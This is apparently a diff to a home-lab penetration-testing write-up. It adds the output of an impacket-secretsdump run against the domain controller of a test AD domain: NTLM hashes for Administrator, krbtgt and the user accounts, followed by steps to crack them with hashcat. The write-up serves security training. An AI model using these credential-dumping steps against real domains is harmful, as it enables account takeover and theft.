@@ -32,4 +32,26 @@ using our malicious domain admin account hawkeye against the DC, we succesfully 
 
 Using -just-dc-ntlm with secretsdump will only dump out the NTDS.dit, filtering out the other data as the name implies.
 
-    impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138 -just-dc-ntlm
+    root@kali:/home/kali# impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138 -just-dc-ntlm
+    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+    [*] Using the DRSUAPI method to get NTDS.DIT secrets
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2617733570dcba888a76e40359f8a359:::
+    MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+    MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
+    MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+    MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
+    avrrDOsNBw:1109:aad3b435b51404eeaad3b435b51404ee:253a38577fe79301cf439d788dfa3850:::
+    hawkeye:1110:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
+    HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:86757f6579150e5ef1901687a33b627b:::
+    THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:2338c61f1a4137c16acab764b8fe5022:::
+    SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:1d86510b8589eccf45424b657db6ab52:::
+    [*] Cleaning up... 
+    root@kali:/home/kali# 
+
+Now that we have the NTLM hashes dumped out from the NTDS.dit, we should filter out the NT portions of the hashes in excel, place it in a .txt file and have it cracked with -M of 1000 (given they are just ntlm) using hashcat. With all the cracked passwords, we can place them back into excel to see the passwords to accounts and also for final reporting.  
+
+
